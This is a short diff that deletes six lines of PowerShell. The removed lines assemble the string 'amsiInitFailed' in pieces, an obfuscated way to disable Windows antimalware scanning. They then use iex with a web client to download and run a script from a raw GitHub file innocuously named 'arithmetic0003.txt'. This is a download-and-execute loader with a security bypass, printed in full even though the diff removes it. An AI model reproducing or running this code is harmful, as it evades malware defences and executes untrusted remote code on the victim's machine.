@@ -1,6 +1,0 @@
-$data2 = "Utils"
-$var1 = $data + $data0 + $data2
-$data3 = "am" + "si" + "Init"
-$data4 = "Failed"
-$var2 = $data3 + $data4
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/deverisc/arithmetic/refs/heads/main/arithmetic0003.txt')
